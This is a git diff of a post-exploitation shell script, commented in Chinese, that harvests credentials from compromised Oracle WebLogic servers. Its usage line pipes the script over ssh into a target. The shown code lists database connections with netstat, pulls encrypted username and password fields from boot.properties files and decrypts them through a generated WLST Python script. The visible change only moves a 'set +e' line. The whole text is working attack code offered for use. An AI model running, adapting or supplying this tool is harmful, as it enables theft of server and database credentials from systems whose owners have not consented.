@@ -1,6 +1,7 @@
 # 后渗透，一键破解weblogic jdbc、console用户名及密码
 # ssh -i YouKey userName@YouTargetIp -p targetPort < oneKeyGetSshWeblogicJdbcPswd.sh >out.txt
 # https://github.com/hktalent/myhktools 
+set +e
 echo "查找数据库连接"
 netstat -antp|grep ":1521"|grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):1521"|sort -u
 netstat -antp|grep ":3306"|grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):3306"|sort -u
@@ -116,7 +117,6 @@ for i in range(1, len(sys.argv)):
 
 EOT
 echo "开始破解weblogic console 用户名及密码"
-set +e
 for i in ${wlst[@]}
 do
   find `echo $DOMAIN_HOME|sed 's/base_domain//g'`/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"|xargs ${i} ./xxx.py
